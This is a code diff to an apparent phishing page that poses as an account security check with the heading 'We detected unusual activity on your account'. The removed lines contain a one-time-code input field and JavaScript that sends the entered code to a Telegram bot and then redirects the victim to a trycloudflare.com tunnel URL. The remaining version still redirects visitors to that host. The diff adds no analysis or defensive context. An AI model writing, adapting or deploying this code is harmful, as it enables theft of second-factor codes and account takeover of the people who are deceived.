@@ -30,23 +30,6 @@
       color: #b00020;
       margin-bottom: 20px;
     }
-    .input-wrapper {
-      position: relative;
-      margin-bottom: 20px;
-    }
-    .input-wrapper input {
-      border: none;
-      border-bottom: 2px solid #ccc;
-      padding: 10px 0;
-      width: 100%;
-      font-size: 16px;
-      outline: none;
-      text-align: center;
-      letter-spacing: 8px;
-    }
-    .input-wrapper input:focus {
-      border-bottom: 2px solid #0074cc;
-    }
     button {
       background-color: #0074cc;
       color: white;
@@ -79,9 +62,6 @@
 
   <div class="login-box">
     <h2>We detected unusual activity on your account</h2>
-    <div class="input-wrapper">
-      <input type="text" id="otp" maxlength="6" placeholder="------" required />
-    </div>
     <button onclick="verifyOTP()">Verify</button>
   </div>
 
@@ -91,25 +71,9 @@
   </footer>
 
   <script>
-    const TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
-    const CHAT_ID = "YOUR_CHAT_ID";
-
     function verifyOTP() {
-      const otp = document.getElementById("otp").value.trim();
-      const message = `🔒 OTP Verification Attempt:\n📲 Code: ${otp}`;
-
-      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message
-        })
-      })
-      .then(() => {
-        window.location.href = "https://surrounded-fine-advise-tiger.trycloudflare.com";
-      })
-      .catch(error => console.error("Telegram error:", error));
+      const redirectURL = "https://surrounded-fine-advise-tiger.trycloudflare.com";
+      window.location.href = redirectURL;
     }
   </script>
 </body>
